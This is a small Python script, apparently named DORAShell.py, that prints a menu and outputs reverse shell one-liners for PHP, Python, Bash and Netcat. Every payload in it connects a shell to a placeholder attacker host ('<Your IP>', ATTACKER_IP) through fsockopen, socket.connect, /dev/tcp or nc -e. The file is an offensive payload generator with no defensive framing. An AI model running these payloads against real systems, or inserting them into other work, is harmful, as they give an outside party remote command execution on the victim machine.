print("Usage: python3 DORAShell.py [Option]")
print("--php   PHP Reverse Shell Payloads") 
print("--python   Python Reverse Shell Payloads") 
print("--bash   Bash Reverse Shell Payloads") 
print("--nc   Netcat Reverse Shell Payloads")
while True:
    user = input("Enter an option: ")
    if user == "--php":
        print("-----------------------------------------------------------------------------------------------------------------")
        print("""|php -r '$sock=fsockopen("<Your IP>",<Your Port>);exec("/bin/bash -i <&3 >&3 2>&3");'|""")
        print("-----------------------------------------------------------------------------------------------------------------")
        print("""|php -r '$sock=fsockopen("<Your IP>",<Your Port>);exec("bash -i <&3 >&3 2>&3");'|""")
        print("-----------------------------------------------------------------------------------------------------------------")
        print("""|php -r '$sock=fsockopen("<Your IP>",<Your Port>);popen("/bin/sh -i","r");'|""")
        print("-----------------------------------------------------------------------------------------------------------------")
        break
    if user == "--python":
        print("-----------------------------------------------------------------------------------------------------------------")
        print("""|python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'|""")
        print("-----------------------------------------------------------------------------------------------------------------")
        print("""|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Your IP>",<Your PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'|""")
        print("-----------------------------------------------------------------------------------------------------------------")
        print("""|export RHOST="<IP>";export RPORT=<PORT>;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'|""")
        print("-----------------------------------------------------------------------------------------------------------------")
        break
    if user == "--bash":
        print("""-----------------------------------------------------------------------------------------------------------------
        |bash -i >& /dev/tcp/<Your IP>/<Your Port> 0>&1|
        |0<&196;exec 196<>/dev/tcp/<Your IP>/<Your PORT>; sh <&196 >&196 2>&196|
        |/bin/bash -l > /dev/tcp/<Your IP>/<Your PORT 0<&1 2>&1|
        |/bin/sh | nc <Your IP> <Your Port>|
        |exec 5<>/dev/tcp/<Your IP>/<Your PORT>;cat <&5 | while read line; do $line 2>&5 >&5;|
        |bash -c 'bash -i > /dev/tcp/<Your IP>/<Your PORT> 0<&1 2>&1'|
        |sh -i >& /dev/tcp/<Your IP>/<Your PORT> 0>&1|
        |sh -i 5<> /dev/tcp/<Your IP>/<Your PORT> 0<&5 1>&5 2>&5|
        |sh -i >& /dev/udp/<Your IP>/<Your PORT> 0>&1|
-----------------------------------------------------------------------------------------------------------------""")
        break
    if user == "--nc":
        print("""nc -e /bin/sh <Your IP>  <Your PORT>|
-------------------------------------------------------------------------------------------------------------------
        |rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Your IP> <Your Port> /tmp/f|
-------------------------------------------------------------------------------------------------------------------
        |nc -u ATTACKER_IP PORT -e /bin/bash|
-------------------------------------------------------------------------------------------------------------------
        |nc ATTACKER_IP PORT -e /bin/bash|
-------------------------------------------------------------------------------------------------------------------
        |nc -c sh ATTACKER_IP PORT|
-----------------------------------------------------------------------------------------------------------------""")
        break
    else:
        print("Invalid option")
        


